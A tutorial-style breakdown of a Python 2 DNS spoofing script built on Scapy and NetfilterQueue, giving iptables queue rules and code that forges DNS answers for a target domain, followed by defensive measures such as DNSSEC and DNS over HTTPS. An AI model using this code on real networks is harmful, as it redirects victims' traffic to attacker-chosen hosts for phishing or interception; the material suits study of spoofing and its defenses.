# Deep Dive: Understanding DNS Spoofing & Packet Manipulation Mechanics

Domain Name System (DNS) resolution is one of the fundamental protocols powering the internet. However, traditional unencrypted DNS operates over plain UDP (Port 53), making it vulnerable to packet manipulation if an intermediary device can inspect and modify network traffic in transit.

This document breaks down a Python demonstration script that uses **Scapy** and **NetfilterQueue** to perform real-time DNS response manipulation.

---

##Executive Overview

When a host requests an IP address for a domain name (e.g., `example.com`), it sends a DNS query packet. If an attacker controls the routing queue between the client and the DNS server (or is situated on the local network path):

1. **Queue Redirection**: Outgoing or passing network packets are placed into a Linux kernel queue (`NFQUEUE`).
2. **Inspection**: The script inspects passing packets for DNS response layers (`DNSRR`).
3. **Payload Injection**: If the query matches a specific domain target, the response payload is replaced with a synthetic resource record containing a designated IP address.
4. **Checksum Recalculation**: IP and UDP checksums and length fields are deleted so Scapy can automatically recalculate them.
5. **Packet Forwarding**: The modified DNS packet is delivered to the requesting client, causing it to resolve the domain to the specified IP address.

---

##System Prerequisites & Network Setup

### System Dependencies
* **Operating System**: Linux kernel with `iptables` and `netfilter` support.
* **Python Environment**: Legacy Python 2.7 runtime.
* **Required Libraries**:
  * `scapy`: Packet construction and parsing library.
  * `netfilterqueue`: Python bindings for `libnetfilter_queue`.

### Kernel Packet Queue Configuration
To direct DNS traffic from the Linux kernel to the user-space Python script, `iptables` queue rules must be applied prior to script execution:

```bash
# Redirect outbound traffic to queue 0 (testing locally)
iptables -I OUTPUT -j NFQUEUE --queue-num 0

# Redirect inbound traffic to queue 0
iptables -I INPUT -j NFQUEUE --queue-num 0

# Flush iptables rules when testing is complete
iptables --flush
```

---

##Technical Code Breakdown

### 1. Packet Interception & Inspection (`process_packet`)

```python
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
```

* **Packet Conversion**: Converts the raw payload received from `netfilterqueue` into a high-level Scapy IP packet object for field extraction and modification.

### 2. DNS Layer Verification & Matching

```python
if scapy_packet.haslayer(scapy.DNSRR):
    qname = scapy_packet[scapy.DNSQR].qname
```

* `scapy.DNSRR` (**DNS Resource Record**): Checks if the packet contains a DNS response layer.
* `scapy.DNSQR` (**DNS Question Record**): Extracts the query domain name (`qname`) requested by the client.

### 3. Injecting Synthetic DNS Resource Records

```python
if "put destnation" in qname:
    print("[+] Spoofing target")
    answer = scapy.DNSRR(rrname=qname, rdata="desired IP addr here so send the traffic to")
    scapy_packet[scapy.DNS].an = answer
    scapy_packet[scapy.DNS].ancount = 1
```

* **Target Matching**: Checks if the requested query name contains the specified string.
* **Forging Response (`DNSRR`)**: Creates a fake DNS resource record linking `qname` to a custom IP address (`rdata`).
* **Overwriting Answer Layer**: Overwrites the answer field (`an`) of the DNS packet with the newly constructed record and sets the answer count (`ancount`) to `1`.

### 4. Length & Checksum Correction

Modifying DNS payloads changes packet length and breaks existing cryptographic layer checksums.

```python
del scapy_packet[scapy.IP].len
del scapy_packet[scapy.IP].chksum
del scapy_packet[scapy.UDP].chksum
del scapy_packet[scapy.UDP].len
```

* **Automatic Recalculation**: Removing `len` and `chksum` attributes forces Scapy to compute correct values automatically when reassembling the binary packet structure.

### 5. Payload Binding & Transmission

```python
packet.set_payload(str(scapy_packet))
packet.accept()
```

* **Payload Re-binding**: Updates the original queue item with the modified Scapy packet byte string.
* **Forwarding**: `packet.accept()` tells the Linux kernel to release and forward the packet to its destination.

---

##Defensive Engineering & Remediation

Plain DNS manipulation demonstrates why unencrypted name resolution poses significant security risks. Modern enterprise networks employ several defensive mechanisms to prevent DNS spoofing:

1. **DNSSEC (DNS Security Extensions)**:
   * Adds digital signatures to DNS records. Clients and resolvers verify signatures against a trust anchor to ensure records have not been tampered with in transit.
2. **DNS over HTTPS (DoH) & DNS over TLS (DoT)**:
   * Encrypts DNS queries using TLS, preventing on-path network devices from inspecting or altering name resolution requests.
3. **Dynamic ARP Inspection (DAI) & Port Security**:
   * Prevents attacker machines from positioning themselves on the path between clients and local DNS servers via ARP spoofing.
4. **Intrusion Prevention Systems (IPS)**:
   * Monitors network segments for mismatched DNS response IDs or abnormal duplicate DNS responses.

---

##Summary Flow Diagram

```
[ Client ] 
   │
   ├── (1) Sends DNS Query (UDP Port 53) ────────► [ NetfilterQueue ]
   │                                                       │
   │                                               Matches Target Domain
   │                                                       │
   │                                                       ▼
   │                                            Overwrites `DNSRR` Layer
   │                                            & Recalculates Checksums
   │                                                       │
   ◄── (2) Receives Spoofed DNS Response ──────────────────┘
   │
   ▼
[ Resolves Target Domain to Forged IP Address ]
